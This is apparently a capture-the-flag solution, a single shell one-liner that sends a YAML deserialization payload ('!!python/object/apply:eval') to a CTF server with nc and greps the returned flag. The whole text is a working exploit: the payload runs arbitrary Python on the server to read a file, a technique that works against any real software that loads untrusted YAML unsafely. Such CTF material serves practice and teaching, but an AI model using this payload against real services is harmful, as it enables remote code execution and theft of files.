nc misc.hsctf.com 9999 -q 1 <<EOF | grep hsctf{.*}
!!python/object/apply:eval [print(open("flag.txt").read())]
EOF
